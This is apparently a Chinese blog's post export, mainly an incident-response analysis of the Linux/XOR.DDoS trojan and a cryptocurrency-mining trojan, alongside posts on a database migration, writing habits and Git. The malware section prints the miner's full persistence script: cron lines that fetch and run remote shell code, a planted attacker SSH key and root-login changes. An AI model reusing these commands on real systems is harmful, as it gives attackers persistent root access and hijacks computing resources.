外网跳板到内网跳板、跳板到数据库等）；预配置／检查工具；连接 切换 &amp; 回退 工具； 四、失败的体验：没有一帆风顺 第一次割接失败了！ 失败的体验 第一次割接之后，系统各项功能正如我们预计的那样顺利运行。就在我们准备庆祝成功的时候，几项关键业务的吞吐量却急剧下降。初步判断是性能问题，因为每次连接时延飙升了100多倍，高达秒级，基本是不可用的。 人工排查几次以后，看到了大量的挂起进程，一堆的锁表。而且失败来源遍布一多半的服务器。虽然不想承认，但是我们不得不做出回退的决定。 万事留后路割接失败是需要承担很大压力的。这次割接是大家都期待很久的，为了几分钟的操作，用户和我们整个团队都付出了很大的努力，调动了方方面面的资源参与进来。 如果说有什么能稍感欣慰的话，那就是我们遍历了各种可能，几乎成功，在不可知的情况出现之后，还能赶在割接窗口结束之前，快速回退。这主要得益于前期准备方案时，特别考虑了最坏的情况，认真演练了回退流程。 这种体验与技术关系不大，来自于勇气——无论是正确的，还是错误的决定。 幽灵进程事后筛查发现，导致割接失败的是一个监测程序——不在生产程序清单里面，没有读统一配置，自带定时调度，零散分布在一半的机器上，早已经被人遗忘。在旧库中，这个问题其实一直存在，但是不会有什么问题。 新数据库的版本是Oracle 11g 。为了提高安全性，防止暴力破解数据库中用户的密码，Oracle默认提供了一种机制：延长失败尝试响应。这种策略是：在连续使用错误密码反复尝试登录时，从第四次错误尝试开始，每次增加1秒的延迟，最长延迟目前是10秒。使用这种手段可以相对比较有效的防治用户密码的暴力破解。 由于系统服务器较多，历史遗留程序瞬间就触发该机制，导致所有应用不可用。 五、总结虽然这次的迁移不甚完美，事情本身也谈不上宏大，简短的一篇更不可能穷举所有的问题和细节，但是有几点思考还是想和大家交流： 5.1 变通 回想起来，开始设计方案时想到的几个大难题，都是通过替代方案实现的：奇葩的内外网分离方案，与IT部门关于权限问题的艰难谈判，数据复制过程中及时性的要求…… 另外，还有真实割接过程中，现场压力状态的进退困境。到处都需要权衡、选择。 决策是一件非常艰难的事情，受到多种因素的制约，最终的决策是一个各种利益妥协的结果。正如另一位资深哲人所说： 项目经理首先要学会变通。——瓦西里.杨 天下武功，无坚不摧，唯变不破。 5.2 韧性 按照最初的方案，我其实并不负责这项工作，后来就算参与进来，也并不负责主导。应该说起初也有侥幸心理，希望有其他人来背这个锅。为了这次迁移，前面已经生生吓走了好几拨人。 从技术上分析，我以前没怎么搞过数据库，并不具备任何优势。 如果说还有一点可以凭借的东西，我感觉是韧性。面对未知的恐惧，敢于直面；面对不确定的方案，不断在尝试；面对失败的后果，坦然接受。 参考文献 密码延迟验证导致的系统HANG住 | yangtingkun 【翻译】为什么我的数据库变得这么慢？ | Cholerae’s Blog 关于Oracle Sharding | Oracle FAQ文档翻译| eygle.com 防范攻击 加强管控 - Oracle数据库安全的16条军规 | eygle.com How to Analyse Row Lock Contention in Oracle 10gR2 and later | kamus iptables高性能前端优化-无压力配置1w+条规则,2017| Bomb250 邱俊涛：如何持久化你的项目经历 从项目上下来之后，需要深入思考并总结之前的经验，这种深入思考会帮助你建立比较完整的知识体系，也可以让你在下一项目中更加得心应手，举一反三。如果只是蜻蜓点水般的“经历”了若干个项目，而不进行深入的总结和思考，相当于把相同的项目用不同的技术栈做了很多遍一样，那和我们平时所痛恨的重复代码又有什么不同呢？ 邱俊涛：如何持久化你的项目经历 Oracle 数据库健康检查平台]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[木马来袭:Linux/XOR.DDoS样本分析]]></title>
    <url>%2F2016%2F06%2F12%2FCyberSecurity-Trojan%2F</url>
    <content type="text"><![CDATA[摘要 Linux/XOR.DDoS 木马入侵分析 在与特洛伊的战争中，我们从未取得优势。— 弗拉基米.耶维奇.严 Linux/XOR.DDoS 木马入侵分析 第一节：编号101 第二节：今天你被挖矿了吗？ 工程师的三大法宝一个有江湖经验的工程师，通常随身携带三件法宝，就像这样： 用户：这个采集点为什么没数据？客服：我们看看工程师各种排查，重启进程客服：现在有了，你再看看？用户：……三天后用户：这个采集点为什么又没数据？工程师各种排查，发现A机房的某台服务器登陆缓慢客服：一台服务器坏了，需要重装系统用户：……系统重装几周后，问题再次来袭工程师：服务器太老了，硬件有问题，建议换新的用户：…… “没有什么问题是重启解决不了的，如果一次不行，那就两次。” 在很多情况下，三板斧确实可以解决不少问题。 重启：包括进程重启和系统重启，鉴于很多程序自身的隐藏性能问题，重启可以释放资源、重新加载配置，或者可能输出异常信息，为解决问题提供思路。重装：修复被破坏的文件，格式化磁盘，修复配置等。有一定效果。换机器：对于有年头的机器有效，磁盘、CPU、主板、乃至于不起眼的一颗电池，都有可能是引发性能问题的瓶颈。 如果排除上述因素，就要警惕自己的机器是不是被植入木马了。我们首先来看一个样本。 特征分析一般特征：功能异常数上升、登陆缓慢、网卡流量异常波动如果木马程序还没有进程隐藏功能的话，还可以在top看到如下信息 12PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND3494 root 19 0 378m 25m 212 R **1595.6** 0.7 5798:34 eyshcjdmzg 这是我抓到的第一个木马样本，所以给它取了个代号：101。 基础分析 篡改crontab 123456789101112# cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/\# run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly\*/3 * * * * root /etc/cron.hourly/gcc.sh 程序入口 123456# vi /etc/cron.hourly/gcc.sh\#!/bin/shPATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/binfor i in `cat /proc/net/dev|grep :|awk -F: &#123;&apos;print $1&apos;&#125;`; do ifconfig $i up&amp; done cp /lib/libudev.so /lib/libudev.so.6/lib/libudev.so.6 木马通过crontab创建时间计划任务来实现启动,运行该gcc.sh，该命令启动所有网卡，并拷贝/lib/libudev.so文件到/lib/libudev.so.6并执行该文件。 攻击路径如果部署了登陆审计平台，或者对方还没来得及清扫犯罪现场，可以看到他的来路：12-bash-4.3# last -10user pts/3 11X.25.49.200 Mon Jun 6 23:46 - 01:47 (02:01) 再根据以上公网IP和时间，可以定位到它的来源是某普通宽带用户。宽带账号：05919399XXXX@fj客户名称：危XX 应急清除策略恢复crontab－&gt;清除gcc.sh －&gt;清除/lib/libudev.so.6 －&gt;查杀进程一定要注意操作顺序，如果只kill掉进程是没有用的，它已经做到自己复制、重启。 XOR.DDoS木马原理编号101是一款国产的Linux系统的远程控制软件（Linux/XOR.DDoS）。 MalwareMustDie首先在2014年10月曝光了该木马。32位和64位的Linux Web服务器、台式机、ARM架构系统等也容易遭受该木马攻击。 杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。 此外，它主要针对游戏和教育网站，能够对其发起强有力的DDoS攻击，可以达到每秒1500亿字节的恶意流量。根据内容分发网络Akamai科技发布的一份报告，XOR DDoS僵尸网络每天至少瞄准20个网站，将近90%的目标站点位于亚洲。报告中声称：“Akamai的安全情报反应小组（SIRT）正在追踪XOR DDoS，这是一个木马恶意软件，攻击者使用它劫持Linux机器并将其加入到僵尸网络，以发起分布式拒绝服务攻击（DDoS）活动。迄今为止，XOR DDoS僵尸网络的DDoS攻击带宽从数十亿字节每秒（Gbps）到150+Gbps。游戏行业是其主要的攻击目标，然后是教育机构。今天早上Akamai SIRT发布了一份安全威胁报告，该报告由安全响应工程师Tsvetelin ‘Vincent’ Choranov所作。” 源码分析多态（Polymorphic） 是指恶意软件在自我繁殖期间不断改变（“morphs”）其自身文件特征码（大小、hash等等）的特点，衍生后的恶意软件可能跟以前副本不一致。因此，这种能够自我变种的恶意软件很难使用基于签名扫描的安全软件进行识别和检测。 木马具有非常多功能：增加服务、删除服务、执行程序、隐藏进程、隐藏文件、下载文件、获取系统信息、发起DDOS攻击等行为。主程序的作用是根据感染目标机器的系统开发版本传输并且选择C&amp;C服务器。C2服务器归属地为美国,加利福尼亚州,洛杉矶。 其实就算是拿到了样本，逆向难度也很大。何况木马关键数据全部加密，传输过程也加密，哪哪都是加密。笔者曾经试图自行破解，找来了《IDA Pro指南》之类的秘籍，无奈功力不够，只能草草收场。 防御之难首先，防御一方是守城战。资源有限，防线漫长，安全投入大见效慢。做与不做效果无法评估，做了不代表没有漏洞，不做也不见得出什么大事。 其次，消极安全观主导制度体系建设。每个大单位都有安全责任制，甚至很多地方都上升到安全KPI一票否决的高度。实际情况呢？ 管理上的松散、各自为战，为了安全KPI，消极看待业务需求，逼得业务方剑走偏锋，反而增加了漏洞风险。 最后，攻防双方技术上完全不对等。攻击者已经进化到大兵团作战模式，兵强马壮，甚至还发展出CaaS（Crime as a Service）这类梦幻般的服务理念。例如僵尸网络不仅可以调度全部资源，提供大规模攻击服务，还能提供间歇性的慢速攻击服务。按需收费，童叟无欺。防御者基本上还是的大刀长矛。这战没发打。 合作如果凭借笔者个人的天资和努力，甚至凭借本公司的力量，几乎可以肯定，我们到现在还不一定能知道这款的木马的名字，更不用说管窥它的细节。因为我们根本就不是安全公司，几百号人里面连一个安全专家都没有。这种情况在其它企业应该也具有普遍性。 在这次的案例中，很快就完成了从样本捕获、攻击分析到安全加固的一系列动作，全程业务不受太大影响，甲方用户基本无感知。关键得益于和第三方的充分合作。 微步在线（ThreatBook）——国内首家威胁情报公司。它们的思路很特别，没有去走传统安全公司的老路，而是专注于威胁情报的样本分析、收集和处理，实现大范围长跨度的数据积累，促进情报交流和信息共享，通过合作创造价值。这个思路对于打破行业、竞争企业的壁垒，意义非凡。 最近，它们刚刚拿到A轮投资，资本市场就是敏锐。 今天你被挖矿了吗？书接上文，针对编号101样本的分析，我们已经知道，黑色产业界通过植入木马，控制了大量主机资源，只要有人花钱，就可以按需要调度足够的资源发动DDos攻击，据说还可以按效果付费。此外，还有一种常见模式则是“挖矿木马”，首先还是来看样本：123456root 3744 29921 0 19:53 pts/0 00:00:00 grep minroot 31333 1 99 19:48 ? 02:46:38/opt/minerd -B -a cryptonight-o stratum+tcp://xmr.crypto-pool.fr:8080 -u48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKkcvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x uptime看到的负载值非常高。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465## 启动脚本echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/crontabs/rootif [ ! -f "/root/.ssh/KHK75NEOiq" ]; then mkdir -p ~/.ssh rm -f ~/.ssh/authorized_keys* echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" &gt; ~/.ssh/KHK75NEOiq echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config echo "RSAAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "PubkeyAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "AuthorizedKeysFile .ssh/KHK75NEOiq" &gt;&gt; /etc/ssh/sshd_config /etc/init.d/sshd restartfiif [ ! -f "/etc/init.d/lady" ]; then if [ ! -f "/etc/systemd/system/lady.service" ]; then mkdir -p /opt curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 fifiservice lady startsystemctl start lady.service/etc/init.d/lady startecho "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/crontabs/rootif [ ! -f "/root/.ssh/KHK75NEOiq" ]; then mkdir -p ~/.ssh rm -f ~/.ssh/authorized_keys* echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" &gt; ~/.ssh/KHK75NEOiq echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config echo "RSAAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "PubkeyAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "AuthorizedKeysFile .ssh/KHK75NEOiq" &gt;&gt; /etc/ssh/sshd_config /etc/init.d/sshd restartfiif [ ! -f "/etc/init.d/lady" ]; then if [ ! -f "/etc/systemd/system/lady.service" ]; then mkdir -p /opt curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 fifiservice lady startsystemctl start lady.service/etc/init.d/lady startmkdir -p /opt# /etc/init.d/lady stop# systemctl stop lady.service# pkill /opt/cron# pkill /usr/bin/cron# rm -rf /etc/init.d/lady# rm -rf /etc/systemd/system/lady.service# rm -rf /opt/KHK75NEOiq33# rm -rf /usr/bin/cron# rm -rf /usr/bin/.cron.old# rm -rf /usr/bin/.cron.new 商业模式被植入比特币“挖矿木马”的电脑，系统性能会受到较大影响，电脑操作会明显卡慢、散热风扇狂转；另一个危害在于，“挖矿木马”会大量耗电，并造成显卡、ＣＰＵ等硬件急剧损耗。比特币具有匿名属性，其交易过程是不可逆的，被盗后根本无法查询是被谁盗取，流向哪里，因此也成为黑客的重点窃取对象。 攻击&amp;防御植入方式：安全防护策略薄弱，利用Jenkins、Redis等中间件的漏洞发起攻击，获得root权限。 最好的防御可能还是做好防护策略、严密监控服务器资源消耗（CPU／load）。 这种木马很容易变种，很多情况杀毒软件未必能够识别：63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 黑暗幽灵（DCM）木马详细分析 深入剖析某国外组织针对中国境内企业的APT攻击(CVE-2015-8651) | 2016-01-18 微步在线 安全威胁情报 隐秘通讯与跳板？C&amp;C服务器究竟是怎么一回事 | 2016-09-23 ArthurKiller FreeBuf 逆向工厂（二）：静态分析技术 | 2016-09-28 追影人 FreeBuf]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最佳写作实践：从Evernote到Ulysses]]></title>
    <url>%2F2016%2F06%2F11%2FWriting%2F</url>
    <content type="text"><![CDATA[摘要 一、写作的定义 二、我的困惑 三、缘起：《顾准日记》 四、写作素材 写作工具箱 180天个人业余写作总结：从缘起、驱动力、工具链、成果影响等角度展开，全方位实录这段过程实践，发表出来对自己是一种鞭策，也希望能够为需要的朋友提供一些思考和帮助。 写作可以成为你的一个伴侣，能在你的周围筑起一个看不见摸不着的水晶空间，你就像鱼缸里的一条金鱼，不过这个鱼缸是金鱼自己造出来的。写作一直陪伴着我，旅途中也没有片刻停下来，所以我从未感到无所事事。不是玻璃需要磨光，就是结构需要调整，要不就是缸体需要加固。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227） 一、写作的定义笔者是一个普通人，跑来谈写作，还是最佳实践，似乎有点标题党的嫌疑，毕竟我既没有专业作家的身份，也不够网红的最低门槛。首先，让我们来看看写作（Writing）的一般定义： Writing is a medium of human communication that represents language and emotion through the inscription or recording of signs and symbols. (From Wikipedia) 因此，写作本质上并不是某些职业的专属技能，而是人类出于交流目的的普遍需求。理解这几个概念之后，后面的话题就好展开了。 二、我的困惑对于很多朋友、特别是已经有过一定实际工作经验的人来说，或许很多都有下面类似的问题，我总结为三大症状： “专业”有余，能力弱化，视野日小 计划愈多，碎片愈多，效率愈低 地狱修行，独行无友，沉于安逸 一般而言，离开学校之后，人群个体开始接受社会化的训练引导，经年之后，大多数人会完成塑造定型，成为分工体系里新的螺丝钉或者齿轮。日子叠着日子，工作夹杂着琐碎，也许积累了不少“专业”知识，但是不知不觉中，有一项最重要的技能却逐渐弱化了——接受新事物的心态、系统掌握新知识、新技能的学习能力。 在多如牛毛的抗战片里面，我认为唯一可看、且达到思想高度的是《我的团长我的团》，剧中死啦死啦的《论安逸》堪称经典：“死都不怕，就怕不安逸，命都不要，就要安逸，就这毛病。多少年来这是个被人钉死了的死穴，一打一个准儿……”。 打个不恰当的比方吧，在学校里读书就像待在正面战场，颇有金戈铁马、喊声震天的味道，或者人人都还在假装有那个味道；在工作以后读书、在过日子中读书，那就不一样了，人民群众喜闻乐见的还得是安逸。升官发财、结婚生子方是热点，读书求道、探索未知却很难找到位置——我们民族的内心深处，和福禄寿走得比较近，距受难先知比较远。 三、缘起：《顾准日记》由于工作的关系，过去一整年的时间里发生了一些变化，对于过去的经历、思想和行为做了比较深入的梳理和反思。基于某些因缘——我很喜欢这个词，“前缘相生，因也；现相助成，缘也”，一切有所得，皆是时机成熟而已。 首要因缘就是是读了《顾准历史文集》和《顾准日记》。 我们想象一下：退回到现代迷信充斥在上世纪70年代的中国，有这样一个“形单影只、独处斗室，以啃冷馒头、钻图书馆度日以至于死”（李慎之语）的知识分子，顶住了政治的、思想的、生存的、体质的重压，不时发出了独立而超前之想。 那是一个会把人席卷而去的时代，他怎么能在风暴中趴在地上紧紧扣住这两颗石子，而不被吹走，甚至连气息都不沾染?顾准后来说过，这一年的生活让他养成‘读史’的习惯。这种习惯的好处就是“样样东西都要自己学着去判断”。(柴静) 关于顾准其人、其事和评价争议，我不想在这里过多展开，唯一需要说明的是：相较于强制劳动和物质匮乏，灌输型的思想管制，才是劳改营的精髓所在。能在长久的牢狱中活下来、不丢失自由本性、甚至能有所成就，学习、思考是唯一的救赎之路，也是最难坚守的“反动”品质。 习惯一旦生成，就会自动带着人去往未知之地。 情怀就是这些，下面介绍一些写作实践过程中的技术细节： 四、写作素材Known Knowns：知识体系重构在开始写东西之前，第一件事情应该是深度梳理自己的知识结构，大而言之，无非是以下三类： Known Knowns:已知的已知 Known UnKnowns:已知的未知 Unknown Unknowns:未知的未知 第一类：通常是就读的专业、长期从事的工作。我们在这些领域往往已经有了较长时间的投入、系统的知识框架和一定的实务经验，是最有可能提供优质输出内容的方向。第二类：主要体现在广度和深度。这部分内容通常是专业内需要涉猎、深入学习的东西，个人能力可以判断自己是否掌握，只要加以努力，都可以有所收获的领域。第三类：更高的境界、超出现有知识体系范围，如果要获得这类知识，一般需要非线性、跨越式的学习经历。示例： 素材一：无笔记不读书在这个《21天精通XX编程》、《图解资治通鉴》、《一本书看透金融》充斥眼帘的时代，还有人深度阅读吗？在这个大师遍地、专家变砖、天天都在喊颠覆的时代，又该把有限的学习精力投资在哪里呢？ 微博上一位牛人曾有高论：“成千上万种媒体与论坛，同质化的,重复的,口号式的,改头換面的,无病呻吟的內容和语言太多太多了，充其量有與论意义而无学术意义”。“如果能选一二本读透读通，读到能基本复述，远比读十本甚至几十本”快餐书”有用、省时间，有一揽众山小之感。” 诚如斯言。少林武功七十二绝技，天下各派兵器、套路更是成千上万，就算是天才，终其一生练其十分之一都不可能。这“一二本”需要读透读通的书，应该就是基本功之外，入门弟子都渴望掌握的上乘功夫、心法口诀，登堂入室之不二法门。 从这个角度出发，我最先尝试的是写读书笔记。 例如最近一年看的《万历十五年》、《伍连德》、《李自成》和《尘埃落定》等传记、小说，如果按照以前的习惯，可能也就是随便翻一翻，但是基于读书笔记的任务导向，主要还是公开发表的鞭策——就不得不反复阅读几遍，以期准确把握作者的意图。 针对另一些大部头的专著，一般会略超出接受能力。我尝试过在线公布进度的方法。也是一个好办法。例如，《性能之颠》： 第一阶段：201601。 分享：《系统专家系列：性能之巅1》 框架结构、未深入第二阶段：201603。关联阅读《24小时365天不间断服务》。 分享《系统专家之路－推荐书单》 分享《基于Linux单机的负载评估》第三阶段：201604-05。 完成第一次通读。掌握体系结构、主要概念。 关联阅读Brendan Gregg’s Blog &amp; Github 。（深度精品） 分享：《Netflix性能分析模型：In 60 Seconds》第四阶段：20160512～计划：深入掌握DTrace、火焰图 在初始的1-2个月时间内，由于先前知识储备的不足，一度出现停滞。后面通过持续的扩展阅读和交流，一扫前期的混沌矇昧状态，宛如打开了一扇通往新世界的窗户。 素材二：让翻译成为一种习惯坦白说，我的英文水平以前并不好，现在也好不到哪里去。今年我养成了业余翻译的习惯，这首先要感谢《Economist》。 在全球报业大萧条的背景下，《Economist》依然能够逆势增长，得益于其独特风格：简约不失观点、视野宽广不失深度、幽默而发人思考、丰富的数据表现力等等。特别是在信息爆炸，甚至信息过载的时代，注意力是最宝贵的资源 , 谁能提供最优质的有效信息，谁就是最有价值的人。经济学人显然做到了。 我还是阅读并翻译一段时间的《Economist》之后才知道，本国相当数量的本科生也在翻译它——他们只是当考研练习题做，真是可惜。回想过去，应该会有不少人和我一样的体会，本朝的英语考试真的非常恶心：卷面上蚂蚁一样小的字、机械的排版、多如牛毛永远也做不完的阅读理解习题、变态的选项设置……几乎要把人的兴趣消磨殆尽，更谈不上什么阅读乐趣。 《Economist》优质的文章，吸引我持续阅读，碰到精妙之处更不禁击节赞叹，甚于把好文章翻译出来和更多人分享，也就成了水到渠成的事。从我熟悉的中国版开始，再到国际关系版块，再到其它感兴趣的文章，甚至于进一步扩展到职业相关领域的内容。通过阅读而翻译，为了更好的翻译就得阅读更多内容，一个良性的反馈环路就此形成。 五、写作工具箱不能否认，总是有很多不世出的神人，完全可以用纯文本写出煌煌巨著、打磨出神兵利器。但是我等凡人，还是需要一些工具的辅助。我的工具箱不是在一开始就形成的——现在也还处于演化过程中，工具链的选择过程，尝试－比较－抛弃的选择过程，本身就是一个不断迭代重构的过程。 工欲善其事，必先利其器 Evernote：素材仓库支持所有手机、平板和电脑。在任意一台设备打开Evernote，随时记录一切、轻松收集资料、一键演示笔记、高效协作共享。 MindManager：框架梳理一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，MindManager可以辅助进行思维整理、分析、可视化的工具。比如写这篇的时候，就是现在MindManager梳理了一个概要，之后导出为文本作为底稿： OmniGraffle：思维可视化由The Omni Group制作的一款绘图软件，它曾获得苹果设计奖。可以支持流程图、逻辑图、模型设计等，堪称万能绘图神器。这年头大家都挺忙的，能用一张图表达的意图，就不用写一大堆字啦。 Markdown：一次编写，到处发表Markdown标记语言，我其实很久以前就掌握了，但是使用频率很低，也谈不上什么美感。真正推动我把Markdown纳入个人工具箱的也是写作，可以说是相辅相成吧。它最大的意义在于通过极简的形式，解决了写作成果的移植通用性的问题。 Ulysses：美轮美奂 版权骑士：打击盗版，人人有责。 “维权骑士”有一套自己的监测系统。签约作者用发表的文章，都会纳入“维权骑士”的监测系统，并与各公众号、网站发布内容进行“比对”。一旦发现抄袭，将负责代表作者维护版权。 阅读用户分析 六、经验谈为了保证持续输出，就需要进行大量扩展活动，甚至通过大量绘图的方式整理思路。例如读完黄仁宇的明史系列文集之后，还专门留意了明朝摩崖石刻遗址、戚继光纪念祠故地，进行现场观察、拍照。 搭建个人网站，将已知、未知、感兴趣的领域划分出来，再把思维碎片、已经发布的作品填充进去，再编辑再梳理，就可以强有力地推动个人知识体系的结构性重构。 内容为王作品发布之后，可以借助分析工具查看阅读量、用户分布等信息。先来看一组数字：180天，累计超10万字，订阅用户数200＋，初步形成微生态圈。 分析这些数字背后的来源，实际上又最集中在以下三篇： 《最佳工程实践－思维利器OmniGraffle》分析：工具指南类型，但是我没有局限于功能性－因为这类一般已经比较多了，不大可能比别人写得更详细、更好，而是从方法论的角度提供建议，获得不少产品经理的青睐。 《新一代Ntopng网络流量监控—可视化和架构分析》分析：相对前沿、内容新，标题党，持续获得专业用户关注。 《Stack Overflow 架构分析》（译）分析：行业大号推荐：单日阅读5000+，对于行业细分领域来说还算不错。甚至在外界传播之后，反向影响到公司内部。 我的这些东西，在一般熟人圈子发，远远没有搞怪照片或抖机灵的段子来的点赞多。如果没有公众发表渠道，我甚至都坚持不下去。 正如《Economist》的成功不在普通的文字编辑，而在于强大的研究智库一样，越是信息爆炸的时代，越是需要高品质的内容输出者。 附录：180天部分写作成果 Economist 译文 《欧洲难民危机》 《沙特王国改革蓝图》 《当代德国纳粹魅影》 读书笔记系列：《万历十五年》、《国士无双伍连德》、《李自成》 外军研究系列：《美军体能训练观察》、《美军士官制度观察》 工具系列： 《最佳工程实践－思维利器OmniGraffle》 《跑步应用Nike+ Running与Garmin Mobile评测》 技术架构系列： 《网络设备OpenSSH7.0兼容性测试报告》 《ZeroMQ 社区生态白皮书》 《新一代Ntopng网络流量监控—可视化和架构分析》 《最佳工程实践－基于Redmine的项目管理平台》 《Stack Overflow 架构分析》（译） 《基于Linux单机的负载评估》 《Netflix性能分析模型：In 60 Seconds》（译） 《TED Talk: the mind behind the Linux》（译） Next 组织一个业余翻译社在实践翻译的过程中发现，个体的力量的多么薄弱。积聚用户需要持续输出，业余写作最大的困难又在于时间投入的不可预期上。如果能借鉴开源的一些形式和技术，是否能够将个人活动提升到团队级别呢？ 或者我应该先去为此搞一笔基金？ 写一个专题文集主要是为了训练定力，提高专业深度。每集至少包含10篇。review:GitBook《Linux Perf Master》(201701,完成) 参考文献 写博客如何助力敏捷团队(How Blogging Empowers Agile Teams)| Matt Jukes - mySociety产品经理 Agile Cambridge 2017]]></content>
      <tags>
        <tag>Mac</tag>
        <tag>工具癖</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Autobiography Of RiboseYim]]></title>
    <url>%2F2016%2F06%2F03%2FAutobiography%2F</url>
    <content type="text"><![CDATA[摘要 2012年9月13日:读卢梭的《忏悔录》，雅克的坦白简直让人震惊！但时作者已是欧洲名人，仍可公开地解剖自己，乃至于一切“肮脏龌龊的行径”。相比于巴顿喋喋不休地介绍自己的光荣家族世系，比较今天那些所谓成功人士粉饰出身的卑鄙手段，我不禁为“惟大英雄能本色”这句话拍案击节。 年表 2018:年度盘点 2017:年度盘点 2016:年度盘点 2012:阅读书单]]></content>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[About RiboseYim]]></title>
    <url>%2F2016%2F05%2F31%2FAboutMe%2F</url>
    <content type="text"><![CDATA[Contact Linkedin Profile My web address is riboseyim.github.io. My public email address is riboseyim@gmail.com. My resume online. Private CommunityFollow me on Twitter at @RiboseYim. My Telegram channel is https://t.me/riboseyim. 知识星球「睿哥读书会」（付费加入）]]></content>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最佳工程实践:版本管理]]></title>
    <url>%2F2016%2F05%2F31%2FTeamWork-Git%2F</url>
    <content type="text"><![CDATA[摘要 思路：《红楼梦》的版本问题 技术出版选题（Git）（电子工业出版社 | 2016） 思路：《红楼梦》的版本问题 甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”） 己卯本（名“脂砚斋四阅评过，己卯冬定本”） 庚辰本（名“脂砚斋四阅评过，庚辰秋定本”） 俄藏本 程高本 思路：代码分包 Perl:pm Java:jar Node.js:npm Go:gvm you can only really use Git if you understand how Git works. Git ABCInstall1234567wget https://github.com/git/git/archive/&#123;tag&#125;.tar.gzgunzip &#123;tag&#125;.tar.gzcd git-&#123;tag&#125;make configure./configure --prefix=/usr/localmakemake install 初始化12345678910git clone git://urlgit init-db## configgit config user.name "your name"git config user.email 